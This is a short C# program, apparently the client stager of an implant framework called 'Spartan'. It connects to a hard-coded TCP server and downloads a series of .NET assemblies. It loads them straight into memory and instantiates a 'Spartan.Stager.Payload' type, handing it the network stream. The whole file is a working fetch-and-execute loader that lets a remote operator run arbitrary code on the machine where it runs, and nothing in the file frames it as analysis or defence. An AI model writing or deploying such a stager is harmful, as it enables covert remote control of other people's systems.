using System.Net.Sockets;
using System.Reflection;

namespace Spartan.Client;

class Program
{
    static void Main(string[] args)
    {
        var serverIpAddress = "127.0.0.1";
        var serverPort = int.Parse("1234");
        
        var tcpClient = new TcpClient(serverIpAddress, serverPort);
        // var payloadLoadContext = new PayloadAssemblyLoadContext();
        
        Dictionary<string, Assembly> loadedAssemblies = new();

        using var binaryReader = new BinaryReader(tcpClient.GetStream());
        using var binaryWriter = new BinaryWriter(tcpClient.GetStream());
        
        var numberOfAssemblies = binaryReader.ReadInt32();
        
        for (var i = 0; i < numberOfAssemblies; i++)
        {
            var assemblyName = binaryReader.ReadString();
            var assemblyLength = binaryReader.ReadInt32();
            var assemblyBytes = binaryReader.ReadBytes(assemblyLength);
            
            // payloadLoadContext.RegisterAssemblyFromBytes(assemblyName, assemblyBytes);
            var assembly = Assembly.Load(assemblyBytes);
            loadedAssemblies[assemblyName] = assembly;
        }
        
        // Load the primary assembly
        
        var payloadType = loadedAssemblies["Spartan.Stager.Payload"].GetType("Spartan.Stager.Payload");
        var createdPayloadInstance = Activator.CreateInstance(payloadType, binaryReader, binaryWriter);
        dynamic payloadInstance = Convert.ChangeType(createdPayloadInstance, payloadType);
        
        Console.WriteLine($"The type of typeInstance is {payloadInstance.GetType()}");
    }
}